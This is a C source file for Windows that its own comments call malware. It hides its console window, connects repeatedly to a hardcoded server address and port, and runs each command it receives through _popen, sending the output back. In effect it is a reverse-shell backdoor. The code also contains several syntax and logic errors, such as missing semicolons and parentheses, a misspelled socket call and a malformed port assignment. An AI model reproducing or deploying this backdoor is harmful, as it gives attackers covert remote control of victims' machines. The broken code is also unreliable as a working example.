#include <stdio.h>
#include <stdlib.h>
#include <Unistd.h> 
#include <winsock2.h>
#include <windows.h>
#include <WinUser.h>
#include <WinInet.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/types.h>

//Globals
#define bzero(p, size) (void) memset((p),0, (size))
int sock;


//Shell Function - To execute commands sent by the Server 
void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while(1) {
        jump:
        bzero(buffer, 1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response);
        recv(sock, buffer, 1024, 0);
        
        if (strncmp("q", buffer, 1) == 0 ) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else {
            FILE *fp;
            fp = _popen(buffer, "r")
            while(fgets(container, 1024, fp) != NULL) {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

//This section of the code Hides the Malware
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowsClass", NULL);

    ShowWindow(stealth, 0);

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsadata;

    ServIP = "192.168.0.102"; //server address
    ServPort = 50005; //Server Port 

    if (WSAStartup(MAKEWORD(2,0), &wsadata) !=0) {
        exit(1);
    }

    sock = sockets(AF_INET, SOCK_STREAM, 0);
    
    // To Set all values to 0
    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr/sin_port = htons(ServAddr);

    while  (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr )) != 0) {
        Sleep(10)
    }

    Shell();

}